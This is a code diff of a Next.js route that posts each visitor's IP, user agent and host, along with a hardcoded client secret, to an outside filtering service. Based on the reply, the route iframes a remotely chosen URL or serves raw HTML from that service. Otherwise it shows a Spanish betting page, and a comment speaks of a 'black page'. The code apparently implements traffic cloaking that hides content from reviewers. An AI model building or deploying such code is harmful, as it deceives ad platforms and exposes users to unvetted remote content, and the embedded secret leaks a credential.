@@ -1,24 +1,23 @@
-import { NextRequest, NextResponse } from 'next/server';
-import { renderPalladiumHTML } from '@/lib/renderPalladiumHtml';
+import { NextRequest, NextResponse } from 'next/server'
 
 function flattenPayload(obj: Record<string, unknown>, prefix = ''): Record<string, string> {
   return Object.entries(obj).reduce((acc, [key, val]) => {
-    const newKey = prefix ? `${prefix}[${key}]` : key;
+    const newKey = prefix ? `${prefix}[${key}]` : key
     if (typeof val === 'object' && val !== null && !Array.isArray(val)) {
-      Object.assign(acc, flattenPayload(val as Record<string, unknown>, newKey));
+      Object.assign(acc, flattenPayload(val as Record<string, unknown>, newKey))
     } else {
-      acc[newKey] = String(val);
+      acc[newKey] = String(val)
     }
-    return acc;
-  }, {} as Record<string, string>);
+    return acc
+  }, {} as Record<string, string>)
 }
 
-const PALLADIUM_URL = 'https://rbl.palladium.expert';
+const PALLADIUM_URL = 'https://rbl.palladium.expert'
 
 export async function GET(req: NextRequest) {
-  const ip = req.nextUrl.searchParams.get('ip') || '8.8.8.8';
-  const ua = req.nextUrl.searchParams.get('ua') || '';
-  const host = req.headers.get('host') || '';
+  const ip = req.nextUrl.searchParams.get('ip') || '8.8.8.8'
+  const ua = req.nextUrl.searchParams.get('ua') || ''
+  const host = req.headers.get('host') || ''
 
   const payload = flattenPayload({
     server: {
@@ -36,43 +35,65 @@ export async function GET(req: NextRequest) {
       clientSecret:
         'MzAyNHdZQUtrRENvN2RxcWNaeWVEblVOY2U2NmY2ZTZmOWRlZjUxMGFjNDBiYTJlNjVjMmFjZGEwMTQyZmZhZQ==',
     },
-  });
+  })
 
   try {
     const res = await fetch(PALLADIUM_URL, {
       method: 'POST',
       headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
       body: new URLSearchParams(payload),
-    });
+    })
 
-    const result = await res.json();
+    const result = await res.json()
 
     if (result?.result) {
-      const { mode, target, content } = result;
+      const { mode, target, content } = result
 
+      // Mode 1: iframe
       if (mode === 1 && target) {
-        const html = `<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width, initial-scale=1"></head><body style="margin:0"><iframe src="${target}" style="width:100%;height:100vh;border:none;"></iframe></body></html>`;
+        const html = `<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width, initial-scale=1" /></head><body style="margin:0"><iframe src="${target}" style="width:100%;height:100vh;border:none;"></iframe></body></html>`
         return new NextResponse(html, {
           status: 200,
           headers: { 'Content-Type': 'text/html' },
-        });
+        })
       }
 
+      // Mode 4: HTML content
       if (mode === 4 && content) {
         return new NextResponse(content, {
           status: 200,
           headers: { 'Content-Type': 'text/html' },
-        });
+        })
       }
     }
   } catch (error) {
-    console.error('[PALLADIUM] Error:', error);
+    console.error('[PALLADIUM ERROR]', error)
   }
 
-  // SSR чорної сторінки з site/page.tsx
-  const html = renderPalladiumHTML(); // ← рендеримо site/page.tsx через SSR
-  return new NextResponse(html, {
+  // Fallback: ручний HTML (не через JSX)
+  const fallbackHtml = `<!DOCTYPE html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <title>Casas de apuestas</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <style>
+      body { margin: 0; background: #001212; color: #fff; font-family: Roboto, sans-serif; }
+    </style>
+  </head>
+  <body>
+    <header style="padding: 16px; background: #002222">
+      <img src="/new_spain/img/logotype.svg" alt="Logo" style="width: 170px;" />
+    </header>
+    <main style="text-align:center; padding: 50px 20px;">
+      <h1>Mejores casas de apuestas <span style="color:#69FE00;">España</span></h1>
+      <p>Contenido personalizado sólo para usuarios reales desde España 🇪🇸</p>
+    </main>
+  </body>
+</html>`
+
+  return new NextResponse(fallbackHtml, {
     status: 200,
     headers: { 'Content-Type': 'text/html' },
-  });
+  })
 }
